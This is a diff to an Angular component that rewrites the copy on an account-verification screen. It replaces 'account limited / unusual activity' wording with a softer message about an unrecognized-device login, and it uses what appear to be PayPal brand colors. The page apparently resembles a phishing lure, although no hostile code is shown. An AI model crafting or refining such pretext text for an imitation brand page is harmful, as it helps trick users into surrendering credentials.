@@ -16,11 +16,11 @@ import { StateService } from '../services/state.service';
         </div>
         
         <h1 class="text-xl font-bold text-slate-900 mb-3">
-          Account Temporarily Limited
+          We need to confirm it's you
         </h1>
         
         <p class="text-sm text-slate-600 leading-relaxed mb-8 max-w-sm">
-          We've noticed some unusual activity on your account. To ensure your security, we need you to confirm your identity before restoring full access.
+          We noticed a login from a device we don't recognize. To keep your account secure, we just need to verify your identity. It will only take a moment to get you back on track.
         </p>
 
         <div class="w-full space-y-4">
@@ -28,14 +28,14 @@ import { StateService } from '../services/state.service';
             (click)="verify()"
             class="w-full bg-[#003087] hover:bg-[#002569] text-white font-bold py-3.5 px-4 rounded-full transition-all duration-200 shadow-sm text-[15px]"
           >
-            Verify Identity
+            Confirm Identity
           </button>
 
           <button 
             (click)="showDialog.set(true)"
             class="w-full text-[#0070ba] font-semibold text-sm hover:underline py-2"
           >
-            Why is my account limited?
+            Why do I need to do this?
           </button>
         </div>
       </div>
